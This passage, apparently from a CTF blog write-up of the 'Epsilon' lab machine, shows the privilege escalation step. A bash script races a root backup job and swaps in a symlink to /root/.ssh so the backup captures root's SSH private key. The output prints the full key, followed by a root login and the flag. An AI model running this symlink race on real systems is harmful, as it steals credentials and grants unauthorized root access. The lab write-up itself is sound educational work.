  <span class="mtk5">if</span> <span class="mtk1">[</span> <span class="mtk5">!</span> <span class="mtk5">-z</span> <span class="mtk4">"$(ls</span> <span class="mtk4">/opt/backups)"</span> <span class="mtk1">]</span><span class="mtk5">;</span> <span class="mtk5">then</span>
    <span class="mtk7">echo</span> <span class="mtk4">'[*]</span> <span class="mtk4">First</span> <span class="mtk4">`tar`</span> <span class="mtk4">executed'</span>
    <span class="mtk7">break</span>
  <span class="mtk5">fi</span>
<span class="mtk5">done</span>

<span class="mtk1">rm</span> <span class="mtk1">-f</span> <span class="mtk1">/opt/backups/checksum</span>
<span class="mtk1">ln</span> <span class="mtk1">-sf</span> <span class="mtk1">/root/.ssh</span> <span class="mtk1">/opt/backups/checksum</span>
<span class="mtk7">echo</span> <span class="mtk4">'[+]</span> <span class="mtk4">Symlink</span> <span class="mtk4">created'</span>

<span class="mtk1">sleep</span> <span class="mtk1">6</span>
<span class="mtk1">file=</span><span class="mtk4">$(ls</span> <span class="mtk4">-la</span> <span class="mtk4">/var/backups/web_backups</span> <span class="mtk5">|</span> <span class="mtk4">tail</span> <span class="mtk4">-1</span> <span class="mtk5">|</span> <span class="mtk4">awk</span> <span class="mtk4">'{</span> <span class="mtk4">print</span> <span class="mtk4">$9</span> <span class="mtk4">}')</span>  
<span class="mtk7">echo</span> <span class="mtk4">"[+]</span> <span class="mtk4">Found</span> <span class="mtk4">file:</span> <span class="mtk1">$file</span><span class="mtk4">"</span>

<span class="mtk1">cp</span> <span class="mtk1">/var/backups/web_backups/$file</span> <span class="mtk1">/tmp</span>
<span class="mtk7">cd</span> <span class="mtk1">/tmp</span>
<span class="mtk1">tar</span> <span class="mtk1">-xvf</span> <span class="mtk1">$file</span>

<span class="mtk7">echo</span> <span class="mtk4">'[!]</span> <span class="mtk4">Symlink</span> <span class="mtk4">content'</span>
<span class="mtk1">ls</span> <span class="mtk1">opt/backups/checksum</span>

<span class="mtk7">echo</span> <span class="mtk4">'[!]</span> <span class="mtk4">`root`</span> <span class="mtk4">SSH</span> <span class="mtk4">key'</span>
<span class="mtk1">cat</span> <span class="mtk1">opt/backups/checksum/id_rsa</span>
</code></pre></div><p>Basically, it waits until a new backup is stored in <code>/opt/backups</code>, then it creates the symlink and waits until the second backup is stored in <code>/var/backups/web_backups</code>. After that, we take the compressed file and extract its contents in order to read <code>/root/.ssh/id_rsa</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">tom@epsilon:/tmp$ bash privesc.sh
[*] First `tar` executed
[+] Symlink created
[+] Found file: 376776221.tar
opt/backups/checksum/
opt/backups/checksum/id_rsa
opt/backups/checksum/id_rsa.pub
opt/backups/checksum/authorized_keys
opt/backups/366066624.tar
[!] Symlink content
authorized_keys  id_rsa  id_rsa.pub
[!] `root` SSH key
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
</code></pre></div><p>Using this SSH private key, we can access to the machine as <code>root</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ssh</span> -i id_rsa root@10.10.11.134  
root@epsilon:~# cat root.txt
cf3d789a49b8c920c09142c741e00c34
</code></pre></div><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l mt6-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contents</p><nav id="TableOfContents"><ul><li><a href="#port-scanning">Port scanning</a></li><li><a href="#web-enumeration">Web enumeration</a></li><li><a href="#git-repository-enumeration">Git repository enumeration</a></li><li><a href="#foothold-on-the-machine">Foothold on the machine</a></li><li><a href="#system-enumeration">System enumeration</a></li><li><a href="#privilege-escalation">Privilege escalation</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">üç∫ <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter" target="popupwindow" onsubmit='return window.open("https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter"),!0'><h3 class="tc">7Rocky's Blog Weekly Newsletter</h3><p class="tc"><input class="f5 pv3 ph3 bn" style="background-color:var(--background);color:inherit;font-weight:700;line-height:normal" type="submit" value="Receive a weekly blog digest"></p><input type="hidden" value="1" name="embed">
<input style="display:none;color:var(--header)" type="submit" value="Subscribe"><p class="tc"><a href="/en/newsletters/" target="_blank" title="View letter archive">View letter archive</a></p><p class="tc">powered by <a href="http://www.mailchimp.com" target="_blank" title="Mailchimp">Mailchimp</a></p></form></div><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; 7Rocky's Blog. Cybersecurity and Maths 2024</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn‚Äî‚ÄîOpens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub‚Äî‚ÄîOpens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></div></footer></body></html>